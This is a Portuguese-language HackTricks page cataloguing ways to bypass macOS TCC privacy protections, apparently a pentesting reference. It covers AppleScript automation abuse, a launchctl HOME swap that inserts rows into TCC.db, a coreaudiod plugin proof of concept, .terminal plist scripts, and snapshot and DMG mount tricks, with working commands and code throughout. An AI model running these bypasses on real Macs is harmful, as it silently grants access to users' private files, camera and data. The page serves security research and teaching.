# Bypasses do macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Por funcionalidade

### Bypass de escrita

Isso não é um bypass, é apenas como o TCC funciona: **ele não protege contra escrita**. Se o Terminal **não tiver acesso para ler a área de trabalho de um usuário, ainda pode escrever nela**:
```shell-session
username@hostname ~ % ls Desktop 
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
O atributo estendido `com.apple.macl` é adicionado ao novo arquivo para dar acesso ao aplicativo criador para lê-lo.

### Bypass SSH

Por padrão, o acesso via SSH terá "Acesso total ao disco". Para desativar isso, você precisa tê-lo listado, mas desativado (removê-lo da lista não removerá esses privilégios):

![](<../../../../.gitbook/assets/image (569).png>)

Aqui você pode encontrar exemplos de como alguns malwares conseguiram contornar essa proteção:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

### Manipular extensões - CVE-2022-26767

O atributo `com.apple.macl` é dado a arquivos para dar a uma determinada aplicação permissões para lê-lo. Este atributo é definido quando arrasta-se e solta-se um arquivo sobre um aplicativo, ou quando um usuário clica duas vezes em um arquivo para abri-lo com o aplicativo padrão.

Portanto, um usuário poderia registrar um aplicativo malicioso para manipular todas as extensões e chamar o Launch Services para abrir qualquer arquivo (assim, o arquivo malicioso terá acesso para lê-lo).

### iCloud

Com a permissão `com.apple.private.icloud-account-access`, é possível se comunicar com o serviço XPC `com.apple.iCloudHelper`, que fornecerá tokens do iCloud.

O iMovie e o Garageband tinham essa permissão e outras que permitiam.

### Bypass do Electron

O código JS de um aplicativo Electron não é assinado, então um invasor poderia mover o aplicativo para um local gravável, injetar código JS malicioso e lançar esse aplicativo e abusar das permissões do TCC.

O Electron está trabalhando na chave `ElectronAsarIntegrity` em Info.plist que conterá um hash do arquivo app.asar para verificar a integridade do código JS antes de executá-lo.

### kTCCServiceAppleEvents / Automação

Um aplicativo com a permissão `kTCCServiceAppleEvents` poderá controlar outros aplicativos. Isso significa que ele poderia ser capaz de abusar das permissões concedidas aos outros aplicativos.

Para mais informações sobre Scripts da Apple, consulte:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Por exemplo, se um aplicativo tiver permissão de Automação sobre o `iTerm`, por exemplo, neste exemplo o `Terminal` tem acesso sobre o iTerm:

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sobre o iTerm

O Terminal, que não tem FDA, pode chamar o iTerm, que tem, e usá-lo para executar ações:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Sobre o Finder

Ou se um aplicativo tem acesso sobre o Finder, ele pode ter um script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Comportamento do aplicativo

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O daemon **tccd** do espaço do usuário está usando a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [esta postagem do Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e porque o daemon TCC está sendo executado via `launchd` dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas para ele.\
Assim, um **atacante poderia definir a variável de ambiente `$HOME`** em **`launchctl`** para apontar para um **diretório controlado**, **reiniciar** o **daemon TCC** e, em seguida, **modificar diretamente o banco de dados do TCC** para dar a si mesmo **todas as permissões do TCC disponíveis** sem nunca solicitar ao usuário final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump                                                               
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

As notas tinham acesso a locais protegidos pelo TCC, mas quando uma nota é criada, ela é **criada em um local não protegido**. Então, você poderia pedir para as notas copiarem um arquivo protegido em uma nota (ou seja, em um local não protegido) e, em seguida, acessar o arquivo:

<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-XXXX - Translocação

O binário `/usr/libexec/lsd` com a biblioteca `libsecurity_translocate` tinha a permissão `com.apple.private.nullfs_allow`, o que permitia criar um **ponto de montagem nullfs** e tinha a permissão `com.apple.private.tcc.allow` com **`kTCCServiceSystemPolicyAllFiles`** para acessar todos os arquivos.

Era possível adicionar o atributo de quarentena à "Library", chamar o serviço XPC **`com.apple.security.translocation`** e, em seguida, mapear a Library para **`$TMPDIR/AppTranslocation/d/d/Library`**, onde todos os documentos dentro de Library poderiam ser **acessados**.

### Rastreamento SQL

Se a variável de ambiente **`SQLITE_AUTO_TRACE`** estiver definida, a biblioteca **`libsqlite3.dylib`** começará a **registrar** todas as consultas SQL. Muitos aplicativos usavam essa biblioteca, então era possível registrar todas as suas consultas SQLite.

Vários aplicativos da Apple usavam essa biblioteca para acessar informações protegidas pelo TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Apple Remote Desktop

Como root, você pode habilitar este serviço e o agente ARD terá acesso total ao disco, o que pode ser abusado por um usuário para fazer uma cópia de um novo banco de dados de usuário TCC.

## Por plugins

Plugins são códigos extras geralmente na forma de bibliotecas ou plist, que serão carregados pela aplicação principal e executarão sob seu contexto. Portanto, se a aplicação principal tiver acesso a arquivos restritos do TCC (por meio de permissões concedidas ou direitos), o código personalizado também terá.

### CVE-2020-27937 - Directory Utility

A aplicação `/System/Library/CoreServices/Applications/Directory Utility.app` tinha o direito `kTCCServiceSystemPolicySysAdminFiles`, carregava plugins com extensão `.daplug` e não tinha o tempo de execução endurecido.

Para tornar essa CVE uma arma, o `NFSHomeDirectory` é alterado (abusando do direito anterior) para poder assumir o banco de dados TCC dos usuários e contornar o TCC.

Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

O binário `/usr/sbin/coreaudiod` tinha os direitos `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. O primeiro permitindo a injeção de código e o segundo dando acesso para gerenciar o TCC.

Este binário permitia carregar plug-ins de terceiros da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível carregar um plugin e abusar das permissões do TCC com este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    
    add_tcc_entry();
    
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```
Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-ins da Camada de Abstração de Dispositivos (DAL)

Aplicativos do sistema que abrem o fluxo da câmera via Core Media I/O (aplicativos com **`kTCCServiceCamera`**) carregam **no processo esses plug-ins** localizados em `/Library/CoreMediaIO/Plug-Ins/DAL` (não restritos pelo SIP).

Apenas armazenar uma biblioteca com o **construtor** comum funcionará para **injetar código**.

Vários aplicativos da Apple eram vulneráveis a isso.

## Por injeção de processo

Existem diferentes técnicas para injetar código dentro de um processo e abusar de seus privilégios TCC:

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

### Firefox

O aplicativo Firefox ainda é vulnerável tendo a permissão `com.apple.security.cs.disable-library-validation`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```
Para mais informações sobre como explorar isso facilmente, [verifique o relatório original](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha as permissões **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, o que permitia injetar código dentro do processo e usar os privilégios TCC.

### CVE-2023-26818 - Telegram

O Telegram tinha as permissões `com.apple.security.cs.allow-dyld-environment-variables` e `com.apple.security.cs.disable-library-validation`, então era possível abusar disso para **acessar suas permissões**, como gravar com a câmera. Você pode [**encontrar o payload no relatório**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

## Por invocações abertas

É possível invocar aberturas em sandboxed&#x20;

### Scripts do Terminal

É bastante comum dar ao terminal **Acesso Total ao Disco (FDA)**, pelo menos em computadores usados por pessoas de tecnologia. E é possível invocar scripts **`.terminal`** usando isso.

Os scripts **`.terminal`** são arquivos plist como este com o comando a ser executado na chave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```
Uma aplicação poderia escrever um script de terminal em um local como /tmp e executá-lo com um comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Por montagem

### CVE-2020-9771 - bypass do TCC mount\_apfs e escalonamento de privilégios

**Qualquer usuário** (mesmo não privilegiado) pode criar e montar um snapshot do time machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é para a aplicação usada (como o `Terminal`) ter acesso de **Acesso Total ao Disco** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que precisa ser concedido por um administrador.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Uma explicação mais detalhada pode ser encontrada no [**relatório original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 e CVE-2021-30808 - Montagem sobre arquivo TCC

Mesmo que o arquivo TCC DB esteja protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db: 

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %} (This is a markdown tag and should not be translated)
```python
# This was the python function to create the dmg
def create_dmg():
	os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
	os.system("mkdir /tmp/mnt")
	os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
	os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
	os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
	os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Verifique o **exploit completo** no [**artigo original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

A ferramenta **`/usr/sbin/asr`** permitia copiar todo o disco e montá-lo em outro lugar, contornando as proteções do TCC.

### Serviços de localização

Existe um terceiro banco de dados do TCC em **`/var/db/locationd/clients.plist`** para indicar os clientes autorizados a **acessar os serviços de localização**.\
A pasta **`/var/db/locationd/` não estava protegida da montagem de DMG**, então era possível montar nosso próprio plist.

## Por aplicativos de inicialização

{% content-ref url="../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Por grep

Em várias ocasiões, arquivos armazenam informações sensíveis como e-mails, números de telefone, mensagens... em locais não protegidos (o que conta como uma vulnerabilidade na Apple).

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Referência

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Maneiras de Contornar os Mecanismos de Privacidade do seu macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
